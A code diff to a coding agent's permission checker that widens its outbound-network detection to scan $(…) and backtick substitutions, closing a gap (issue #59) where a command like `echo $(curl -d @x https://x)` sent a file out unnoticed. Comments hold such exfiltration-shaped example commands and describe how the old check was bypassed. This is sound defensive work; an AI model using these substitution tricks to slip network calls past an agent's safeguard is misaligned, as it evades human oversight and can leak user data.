@@ -82,6 +82,7 @@ import { resolveToCwd } from "@oh-my-pi/pi-coding-agent/tools/path-utils";
 import { extractLeadingCdTarget, tokenizeShellSegments } from "@oh-my-pi/pi-coding-agent/tools/shell-tokenize";
 import { getConfigRootDir, getPluginsLockfile } from "@oh-my-pi/pi-utils";
 import { evaluateFloor, type FloorEntry } from "./floor";
+import { substitutionSpans } from "./shell-ast";
 import { judgeBattery, judgeJevV3 } from "./jev-judge";
 import { buildAuthorizationState, DEFAULT_AUTHORIZATION_POLICY, deriveAuthorization, summarizeActions, type ActionSummaryEntry, type JevAuthorizationLevel } from "./authorization";
 import { deriveDecisionOrder, type DecisionBranch } from "./decision-order";
@@ -1235,33 +1236,61 @@ const SEND_DATA_FLAGS: Record<string, true> = {
 	"--method": true, "--body-data": true, "--post-file": true,
 };
 
+/** `$(…)`, `<(…)` and backtick SPANS of `text`: substitution is outside the
+ *  tokenizer's scope, so a span is unusable as a lead word and must be
+ *  scanned as its own command. Shells parse the spans (quoting and nesting
+ *  included) in shell-ast, which owns the parser; this keeps one collector in
+ *  the repository. */
+
+/** Does one command segment hold a network verb within reach? Its own lead
+ *  word and every later pipe stage's lead run the same clearing rules: a
+ *  read-shaped fetch clears (whole segment — isPlainReadOnlyFetch judges the
+ *  pipeline too), the `gh` carveout decides on its tokens, and every other
+ *  NETWORK_VERBS lead fails closed. Shared by the owner scan and the
+ *  substitution-span scan below, which must never disagree. Later stages skip
+ *  leading `VAR=` assignments first, as the stage-0 lead does: the stage's
+ *  first token is the assignment, not the verb (`printf hi | FOO=bar ssh
+ *  host cat`). */
+function segmentLeadsOutbound(segment: string): boolean {
+	const stages = splitPipeStages(segment);
+	const leadWords = tokenizeShellSegments(stages[0] ?? "")[0] ?? [];
+	let skipped = 0;
+	while (skipped < leadWords.length && /^[a-z_][a-z0-9_]*=/iu.test(leadWords[skipped])) skipped++;
+	const lead = commandBasename((leadWords[skipped] ?? "").toLowerCase());
+	if ((lead === "curl" || lead === "wget") && isPlainReadOnlyFetch(segment)) return false;
+	if (lead === "gh" && !ghApiWrites(leadWords)) return false;
+	if (NETWORK_VERBS[lead]) return true;
+	for (let i = 1; i < stages.length; i++) {
+		const stageTokens = tokenizeShellSegments(stages[i])[0] ?? [];
+		let stageSkipped = 0;
+		while (stageSkipped < stageTokens.length && /^[a-z_][a-z0-9_]*=/iu.test(stageTokens[stageSkipped])) stageSkipped++;
+		const stageLead = commandBasename((stageTokens[stageSkipped] ?? "").toLowerCase());
+		if (stageLead === "gh" && !ghApiWrites(stageTokens)) continue;
+		if (NETWORK_VERBS[stageLead]) return true;
+	}
+	return false;
+}
+
 export function commandHasOutboundNetwork(command: string): boolean {
 	// A document that mentions `wget` is not a fetch: heredoc bodies come off
 	// the raw command first, and an executed one is scanned as its own command.
-	// An unquoted body's `$(curl …)` does run at write time, but this scan reads
-	// segment LEADS and `$(curl …)` is not a lead in any position — `echo
-	// $(curl -d @x https://x)` is invisible to it with no heredoc in sight
-	// (issue #59). Handing it expanded bodies would buy nothing here and would
-	// put the documentation false positive back.
+	// A QUOTED body's `$(curl …)` never runs, so stripping it first keeps the
+	// documentation false positive dead even under the span scan. An unquoted
+	// body's `$(curl …)` does run at write time — the strip deliberately
+	// leaves it in place, and the span scan reads it there (issue #59).
 	const normalized = withoutWrittenHeredocBodies(command).replace(/\\\r?\n/gu, "");
 	for (const text of splitTopLevelCommands(normalized)) {
 		// `||` passes splitTopLevelCommands unsplit, so the fallback half of
 		// `false || ssh host cat` would be invisible here; split it locally.
 		for (const segment of splitOrFallbacks(text)) {
 			const inert = segment.replace(/(^|\s)2>&1(?=\s|$)/gu, " ");
-			const stages = splitPipeStages(inert);
-			const leadWords = tokenizeShellSegments(stages[0] ?? "")[0] ?? [];
-			let skipped = 0;
-			while (skipped < leadWords.length && /^[a-z_][a-z0-9_]*=/iu.test(leadWords[skipped])) skipped++;
-			const lead = commandBasename((leadWords[skipped] ?? "").toLowerCase());
-			if ((lead === "curl" || lead === "wget") && isPlainReadOnlyFetch(inert)) continue;
-			if (lead === "gh" && !ghApiWrites(leadWords)) continue;
-			if (NETWORK_VERBS[lead]) return true;
-			for (let i = 1; i < stages.length; i++) {
-				const stageTokens = tokenizeShellSegments(stages[i])[0] ?? [];
-				const stageLead = commandBasename((stageTokens[0] ?? "").toLowerCase());
-				if (stageLead === "gh" && !ghApiWrites(stageTokens)) continue;
-				if (NETWORK_VERBS[stageLead]) return true;
+			if (segmentLeadsOutbound(inert)) return true;
+			// A network verb inside `$(…)` or backticks is not a segment lead
+			// in any position — argument, later stage, or heredoc body — so its
+			// span runs the same lead-word scan: `echo $(curl -d @x https://x)`
+			// is invisible to the lead word alone (issue #59).
+			for (const span of substitutionSpans(inert)) {
+				if (segmentLeadsOutbound(span)) return true;
 			}
 		}
 	}
